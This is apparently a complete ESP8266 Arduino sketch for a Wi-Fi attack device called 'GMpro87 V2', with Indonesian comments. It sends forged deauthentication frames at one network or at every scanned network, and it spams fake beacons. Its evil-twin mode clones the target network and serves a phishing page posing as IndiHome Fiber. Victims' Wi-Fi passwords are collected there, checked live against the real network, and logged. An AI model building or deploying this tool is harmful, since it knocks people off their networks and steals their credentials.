#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <LittleFS.h>

extern "C" {
#include "user_interface.h"
}

// --- CONFIG & STATE ---
typedef struct { String ssid; uint8_t ch; uint8_t bssid[6]; int rssi; } _Network;
_Network _networks[20];
int target_id = -1;
unsigned long attack_now = 0, scan_now = 0, beacon_now = 0;
bool deauth_target = false, evil_twin = false, beacon_spam = false, mass_deauth = false;

IPAddress apIP(192, 168, 4, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

// --- LOGGING ---
void saveLog(String data) {
  File f = LittleFS.open("/log.txt", "a");
  if (f) { f.println("[" + data + "]"); f.close(); }
}

String getLogs() {
  if (!LittleFS.exists("/log.txt")) return "[SYSTEM] Monitoring...";
  File f = LittleFS.open("/log.txt", "r");
  String out = "";
  while (f.available()) { out += f.readStringUntil('\n') + "<br>"; }
  f.close();
  return out;
}

// --- CORE ENGINE (FIXED) ---
void sendDeauth(uint8_t* bssid, uint8_t ch) {
  // FIX: Harus pindah channel sebelum nembak!
  if (wifi_get_channel() != ch) wifi_set_channel(ch);
  
  uint8_t pkt[26] = {
    0xC0, 0x00, 0x31, 0x00, 
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Receiver: Broadcast
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (diisi nanti)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (diisi nanti)
    0x00, 0x00, 0x01, 0x00
  };
  memcpy(&pkt[10], bssid, 6); 
  memcpy(&pkt[16], bssid, 6);
  
  wifi_send_pkt_freedom(pkt, 26, 0);
  pkt[0] = 0xA0; // Disassociate frame
  wifi_send_pkt_freedom(pkt, 26, 0);
}

void sendBeacon(String ssid, uint8_t ch) {
  if (wifi_get_channel() != ch) wifi_set_channel(ch);
  uint8_t pkt[128] = { 0x80, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x64, 0x00, 0x21, 0x04, 0x00, (uint8_t)ssid.length() };
  for(int i=0; i<(int)ssid.length(); i++) pkt[36+i] = ssid[i];
  wifi_send_pkt_freedom(pkt, 36 + ssid.length(), 0);
}

// --- WEB PAGES ---
void handleRoot() {
  if (webServer.hasArg("password")) {
    String p = webServer.arg("password");
    if (target_id != -1) {
      saveLog("TRY: " + p);
      WiFi.begin(_networks[target_id].ssid.c_str(), p.c_str());
      unsigned long start = millis();
      while (WiFi.status() != WL_CONNECTED && millis() - start < 8000) { delay(100); yield(); }
      if (WiFi.status() == WL_CONNECTED) {
        saveLog("SUCCESS! PASS: " + p);
        WiFi.disconnect();
        webServer.send(200, "text/html", "<h1>SUCCESS</h1>");
      } else {
        saveLog("WRONG: " + p);
        WiFi.disconnect();
        webServer.send(200, "text/html", "<script>alert('Wrong Password');history.back();</script>");
      }
    }
    return;
  }

  if (evil_twin && target_id != -1) {
    String portal = F("<html><head><meta name='viewport' content='width=device-width,initial-scale=1'><style>body{color:#333;font-family:sans-serif;margin:0;background:#f4f4f4;}nav{background:#ee2e24;color:#fff;padding:1.5em;text-align:center;font-weight:bold;}.main{background:#fff;margin:20px auto;padding:2em;max-width:400px;border-radius:8px;}input[type='password']{width:100%;padding:12px;margin:15px 0;}input[type='submit']{width:100%;padding:12px;background:#ee2e24;color:#fff;border:none;border-radius:4px;}</style></head><body><nav>INDIHOME FIBER</nav><div class='main'><h1>Verifikasi Keamanan</h1><form action='/' method='POST'><input type='password' name='password' placeholder='Password WiFi' required minlength='8'><input type='submit' value='HUBUNGKAN'></form></div></body></html>");
    webServer.send(200, "text/html", portal);
    return;
  }

  if (webServer.hasArg("sel")) target_id = webServer.arg("sel").toInt();
  if (webServer.hasArg("act")) {
    String a = webServer.arg("act");
    if (a == "deauth") deauth_target = !deauth_target;
    if (a == "evil") { 
      evil_twin = !evil_twin; 
      if(evil_twin && target_id != -1) {
        WiFi.softAP(_networks[target_id].ssid.c_str()); 
        deauth_target = true; 
      } else { 
        WiFi.softAP("GMpro87_V2", "Sangkur87"); 
      } 
    }
    if (a == "beacon") beacon_spam = !beacon_spam;
    if (a == "mass") mass_deauth = !mass_deauth;
    
    // FIX: Saat menyerang, matikan scanning agar radio fokus nembak
    if (deauth_target || mass_deauth || beacon_spam) wifi_promiscuous_enable(1);
    else wifi_promiscuous_enable(0);
  }
  if (webServer.hasArg("clear")) { LittleFS.remove("/log.txt"); saveLog("Cleared"); }

  String h = F("<html><head><meta name='viewport' content='width=device-width,initial-scale=1.0'><style>");
  h += F("body { background: #0a0a0a; color: #fff; font-family: sans-serif; text-align: center; margin: 0; padding: 10px; }");
  h += F(".content { max-width: 500px; margin: auto; background: #151515; padding: 20px; border-radius: 12px; border: 1px solid #333; }");
  h += F("h1 { color: #ee2e24; text-transform: uppercase; letter-spacing: 3px; margin-bottom: 20px; font-size: 1.5em; }");
  h += F(".grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 20px; }");
  h += F(".btn { padding: 15px; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 10px; transition: 0.3s; text-transform: uppercase; text-decoration: none; display: inline-block; }");
  h += F(".on { background: #ee2e24; box-shadow: 0 0 15px #ee2e24; color: #fff; text-shadow: 0 0 5px #fff; } .off { background: #444; color: #888; }");
  h += F("table { width: 100%; border-collapse: collapse; margin-top: 10px; } th { color: #ee2e24; font-size: 11px; border-bottom: 2px solid #333; padding-bottom: 10px; }");
  h += F("td { border-bottom: 1px solid #222; padding: 10px; font-size: 10px; } .sel { background: #2e7d32; color: #fff; border-radius: 4px; padding: 5px; } .unsel { background: #555; color: #ccc; border-radius: 4px; padding: 5px; }");
  h += F(".log-container { margin-top: 20px; text-align: left; background: #000; padding: 10px; border: 1px solid #ee2e24; border-radius: 6px; font-family: monospace; font-size: 10px; overflow-y: auto; max-height: 150px; }");
  h += F(".log-title { color: #ee2e24; font-weight: bold; margin-bottom: 5px; text-transform: uppercase; border-bottom: 1px solid #333; display: block; } .log-entry { color: #0f0; margin-bottom: 2px; line-height: 1.4; }");
  h += F("</style></head><body><div class='content'><h1>GMpro87 V2</h1><div class='grid'>");

  h += "<a href='/?act=deauth' class='btn " + String(deauth_target?"on":"off") + "'>DEAUTH TARGET</a>";
  h += "<a href='/?act=evil' class='btn " + String(evil_twin?"on":"off") + "'>EVIL TWIN</a>";
  h += "<a href='/?act=beacon' class='btn " + String(beacon_spam?"on":"off") + "'>BEACON SPAM</a>";
  h += "<a href='/?act=mass' class='btn " + String(mass_deauth?"on":"off") + "'>MASS DEAUTH</a></div>";
  h += F("<a href='/?clear=1' class='btn' style='background:#800; width:100%; margin-bottom:15px;'>CLEAR SYSTEM LOG</a><table><tr><th>SSID</th><th>CH</th><th>SIG</th><th>SELECT</th></tr>");

  for(int i=0; i<20; i++){
    if(_networks[i].ch == 0) continue;
    int sig = (2 * (_networks[i].rssi + 100)); if(sig>100) sig=100;
    h += "<tr><td>"+_networks[i].ssid+"</td><td>"+String(_networks[i].ch)+"</td><td>"+String(sig)+"%</td>";
    h += "<td><a href='/?sel="+String(i)+"' class='btn "+(target_id==i?"sel":"unsel")+"'>"+(target_id==i?"ACTIVE":"SEL")+"</a></td></tr>";
  }

  h += F("</table><div class='log-container'><span class='log-title'>System & Password Log</span><div class='log-entry'>");
  h += getLogs();
  h += F("</div></div></div></body></html>");
  webServer.send(200, "text/html", h);
}

void setup() {
  LittleFS.begin();
  // Mode AP_STA tetap digunakan
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP("GMpro87_V2", "Sangkur87");
  dnsServer.start(53, "*", apIP);
  webServer.on("/", handleRoot);
  webServer.onNotFound(handleRoot);
  webServer.begin();
  saveLog("SYSTEM READY");
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();

  // ATTACK LOOP
  if (millis() - attack_now >= 100) { // Dipercepat biar kerasa serangannya
    if (deauth_target && target_id != -1) {
      sendDeauth(_networks[target_id].bssid, _networks[target_id].ch);
    }
    if (mass_deauth) {
      for(int i=0; i<20; i++) {
        if(_networks[i].ch != 0) sendDeauth(_networks[i].bssid, _networks[i].ch);
      }
    }
    attack_now = millis();
  }

  // BEACON LOOP
  if (beacon_spam && millis() - beacon_now >= 100) {
    if(target_id != -1) sendBeacon(_networks[target_id].ssid, _networks[target_id].ch);
    beacon_now = millis();
  }

  // SCAN LOOP (Hanya scan kalau serangan OFF agar tidak tabrakan channel)
  if (millis() - scan_now >= 10000 && !deauth_target && !mass_deauth && !beacon_spam) {
    int n = WiFi.scanNetworks(false, true);
    for (int i=0; i<n && i<20; i++) { 
      _networks[i].ssid=WiFi.SSID(i); 
      _networks[i].ch=WiFi.channel(i); 
      _networks[i].rssi=WiFi.RSSI(i); 
      memcpy(_networks[i].bssid, WiFi.BSSID(i), 6); 
    }
    scan_now = millis();
  }
}
